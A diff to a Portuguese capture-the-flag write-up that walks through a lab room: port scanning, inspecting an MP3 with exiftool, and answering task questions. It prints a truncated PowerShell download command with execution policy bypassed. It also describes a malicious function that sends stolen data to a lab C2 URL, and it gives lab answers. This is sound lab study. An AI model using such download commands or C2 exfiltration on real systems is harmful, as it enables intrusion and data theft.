@@ -7,7 +7,7 @@ Segurança operaciona
 
 Dia 1: Talvez a música do SOC-mas, ele pensou, não venha de uma loja?
 
-RESOLUÇÃO DAS QUESTÕES:
+PASSO A PASSO PARA A RESOLUÇÃO DAS QUESTÕES:
 
 Executei o Nmap para escanear as portas que estavam abertas, o resultado mostrou 3 portas:
 Porta 22 (SSH)
@@ -48,4 +48,22 @@ powershell.exe -ep bypass -nop -c (New-Object Net.WebClient).DownloadFile('https
 RESPONDENDO A 1ª PERGUNTA
 ![image](https://github.com/user-attachments/assets/45ce33f5-bab7-4c73-b64f-6bede4101ee0)
 Eu também usei o exiftool no arquivo song.mp3, confirmando que ele era realmente um arquivo MP3 e obtendo a informação da 1ª pergunta da TAREFA 7, sendo o Artista: Tyler Ramsbey
+![image](https://github.com/user-attachments/assets/9eb60ee0-4281-454e-90bd-57aed094c6fa)
+
+
+
+
+
+RESPODENDO A 2ª PERGUNTA
+![image](https://github.com/user-attachments/assets/84059020-f16f-4cc7-9b70-8812c1ed0da0)
+Você executou o comando exiftool somg.mp3, copie o link, e cole no navegador, e analise o conteúdo, e que responde nossa pergunta está na função Send-InfoToC2Server que envia as informações roubadas para um servidor C2 (Command and Control) usando um comando Invoke-WebRequest. O servidor C2 especificado está localizado na URL http://papash3ll.thm/data.
+![image](https://github.com/user-attachments/assets/e8316db0-ac58-46a6-a9ad-d1b66e6df77c)
+![image](https://github.com/user-attachments/assets/29092bbb-e21b-436d-a9fe-cb63d0b974d1)
+
+
+
+
+
+
+
 
